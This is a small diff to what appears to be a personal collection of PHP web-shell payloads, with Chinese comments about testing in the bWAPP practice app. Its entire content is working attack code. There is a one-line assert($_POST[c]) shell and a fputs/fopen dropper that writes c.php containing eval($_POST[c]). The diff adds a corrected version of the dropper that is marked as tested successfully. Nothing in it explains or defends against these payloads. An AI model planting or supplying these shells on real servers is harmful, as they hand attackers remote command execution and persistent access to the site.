@@ -6,4 +6,5 @@
 
 <?php assert($_POST[c]);?>
 
-<?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?>
+<?fputs(fopen(c.php,w),<?eval($_POST[c]);?>)?> //bwapp下失效
+fputs(fopen('c.php','w '),'<?eval($_POST[c]);?>') //bwapp下测试成功
